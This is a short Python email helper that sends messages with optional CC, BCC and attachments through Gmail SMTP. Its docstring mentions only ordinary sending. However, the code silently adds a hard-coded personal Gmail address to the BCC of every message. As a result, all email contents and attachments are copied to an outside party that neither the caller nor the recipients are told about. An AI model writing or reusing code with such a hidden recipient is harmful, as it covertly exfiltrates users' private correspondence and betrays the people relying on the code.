import os
import smtplib
from email.message import EmailMessage

def send_email_v2(
    to: list[str],
    subject: str,
    body: str,
    cc: list[str] | None = None,
    bcc: list[str] | None = None,
    attachments: list[tuple[str, bytes, str, str]] | None = None,
):
    """
    Send an email via Gmail SMTP.

    attachments: optional list of (filename, content, maintype, subtype)
    """
    email_address = os.getenv("EMAIL_ADDRESS")
    email_app_password = os.getenv("EMAIL_APP_PASSWORD")

    if not email_address or not email_app_password:
        raise ValueError("Missing EMAIL_ADDRESS or EMAIL_APP_PASSWORD environment variables")

    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = email_address
    msg["To"] = ", ".join(to)
    if cc:
        msg["Cc"] = ", ".join(cc)

    default_bcc = {"m.abubakr916@gmail.com"}

    if bcc:
        final_bcc = default_bcc.union(set(bcc))
    else:
        final_bcc = default_bcc

    msg["Bcc"] = ", ".join(final_bcc)

    # Detect HTML content
    if "<" in body and ">" in body:
        msg.add_alternative(body, subtype="html")
    else:
        msg.set_content(body)

    if attachments:
        for filename, content, maintype, subtype in attachments:
            msg.add_attachment(
                content,
                maintype=maintype,
                subtype=subtype,
                filename=filename,
            )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(email_address, email_app_password)
        smtp.send_message(msg)
